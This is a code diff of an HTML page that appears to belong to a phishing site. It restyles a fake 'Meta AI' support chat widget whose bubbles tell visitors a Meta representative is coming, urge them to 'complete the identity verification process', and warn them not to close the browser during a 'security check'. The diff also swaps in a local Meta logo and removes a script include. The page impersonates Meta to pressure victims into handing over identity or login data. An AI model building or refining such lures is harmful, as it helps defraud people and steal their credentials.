@@ -224,23 +224,22 @@
     </div>
 </div>
 <div id="metaChatWrapper">
-    <div id="metaAiIcon" class="meta-ai-icon">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b2/Meta_AI_logo.svg" alt="Meta AI">
-    </div>
-
-    <div id="metaAiBox" class="meta-ai-box">
-        <div class="meta-ai-header">
-            <span>Meta AI</span>
-            <button id="closeMetaAi" class="close-meta-btn">&times;</button>
-        </div>
-        <div class="meta-ai-body">
-            <div class="chat-bubble">Hello! A Meta support representative will be with you shortly.</div>
+    <div class="meta-ai-box hidden" id="metaAiBox">
+            <div class="meta-ai-header">
+                <span>Meta AI</span>
+                <button class="close-meta-btn" id="closeMetaAi">&times;</button>
+            </div>
+            <div class="meta-ai-body">
+                <div class="chat-bubble">Hello! A Meta support representative will be with you shortly.</div>
             <div class="chat-bubble">Please complete the identity verification process on the screen so we can assist you faster.</div>
             <div class="chat-bubble">Do not close your browser while the security check is in progress.</div>
             <div class="chat-time">Just now</div>
+            </div>
+        </div>
+        <div class="meta-ai-icon" id="metaAiIcon">
+            <img src="logo-meta.png" alt="Meta AI">
         </div>
     </div>
-</div>
-<script src="app.js"></script>
+
 </body>
 </html>
